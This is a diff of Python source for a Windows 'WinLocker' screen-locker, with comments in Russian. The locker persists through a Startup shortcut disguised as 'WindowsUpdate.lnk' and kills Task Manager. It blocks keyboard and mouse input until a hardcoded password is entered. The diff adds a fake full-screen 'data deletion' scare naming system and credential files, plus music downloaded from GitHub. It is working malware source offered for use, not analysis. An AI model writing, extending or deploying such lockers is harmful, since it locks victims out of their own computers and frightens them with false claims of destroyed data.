@@ -14,29 +14,24 @@ from win32com.client import Dispatch
 # ============================================================
 # >>> НАСТРОЙКИ <<<
 PASSWORD = "1601"
-TIMER_SECONDS = 15   # стартовый таймер (0 — если из автозагрузки)
+TIMER_SECONDS = 900   # 15 минут
+# Прямая ссылка на твой MP3-файл на GitHub
+MUSIC_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/music.mp3"
 # ============================================================
 
 # ---------- НАДЁЖНЫЙ АВТОСТАРТ (ПАПКА + ЯРЛЫК) ----------
 def add_to_startup():
     try:
-        # Путь к текущему файлу (может быть .py)
         current_path = os.path.abspath(__file__)
-        # Формируем путь с расширением .pyw
         pyw_path = os.path.splitext(current_path)[0] + ".pyw"
-        
-        # Если текущий файл не .pyw, создаём копию .pyw
         if not current_path.endswith(".pyw"):
             try:
                 shutil.copy2(current_path, pyw_path)
             except:
                 pass
             current_path = pyw_path
-        
-        # Создаём ярлык в папке автозагрузки
         startup_folder = winshell.startup()
         shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
-        
         shell = Dispatch('WScript.Shell')
         shortcut = shell.CreateShortCut(shortcut_path)
         shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
@@ -93,6 +88,46 @@ def show_boot_animation():
             root.update()
             time.sleep(2)
         root.destroy()
+    except:
+        pass
+
+# ---------- ФАЛЬШИВОЕ УНИЧТОЖЕНИЕ ДАННЫХ ----------
+def show_fake_deletion():
+    try:
+        root = tk.Tk()
+        root.attributes('-fullscreen', True)
+        root.configure(bg='black')
+        lbl = tk.Label(root, text="", fg='white', bg='black',
+                       font=('Courier', 24, 'bold'))
+        lbl.pack(expand=True)
+        files = [
+            "C:\\Windows\\System32\\config\\SAM",
+            "C:\\Users\\bogdan\\Documents\\passwords.txt",
+            "C:\\Users\\bogdan\\Desktop\\bitcoin_wallet.dat",
+            "C:\\Users\\bogdan\\Pictures\\photo.jpg",
+            "C:\\Users\\bogdan\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
+        ]
+        for file in files:
+            lbl.config(text=f"УДАЛЕНИЕ: {file}")
+            root.update()
+            time.sleep(1.5)
+        lbl.config(text="УДАЛЕНИЕ ЗАВЕРШЕНО. ДАННЫЕ УНИЧТОЖЕНЫ.")
+        root.update()
+        time.sleep(3)
+        root.destroy()
+    except:
+        pass
+
+# ---------- ВОСПРОИЗВЕДЕНИЕ МУЗЫКИ ----------
+def play_music():
+    try:
+        import pygame.mixer as mixer
+        mixer.init()
+        music_file = os.path.join(tempfile.gettempdir(), "wd2_theme.mp3")
+        if not os.path.exists(music_file):
+            urllib.request.urlretrieve(MUSIC_URL, music_file)
+        mixer.music.load(music_file)
+        mixer.music.play(-1)
     except:
         pass
 
@@ -172,22 +207,22 @@ class WinLocker:
             self.entry.delete(0, tk.END)
 
     def animate(self):
-        # Просто поддерживаем окно "живым"
         self.win.after(50, self.animate)
 
 # ============================================================
 if __name__ == "__main__":
-    # Если скрипт запущен из автозагрузки — таймер не нужен
     if os.path.basename(sys.argv[0]) != "winlocker.py":
         TIMER_SECONDS = 0
 
     add_to_startup()
     threading.Thread(target=kill_taskmgr, daemon=True).start()
+    threading.Thread(target=play_music, daemon=True).start()
     time.sleep(TIMER_SECONDS)
 
     block_input(True)
     threading.Thread(target=block_all_keys, daemon=True).start()
 
     show_boot_animation()
+    show_fake_deletion()
     WinLocker()
     tk.mainloop()
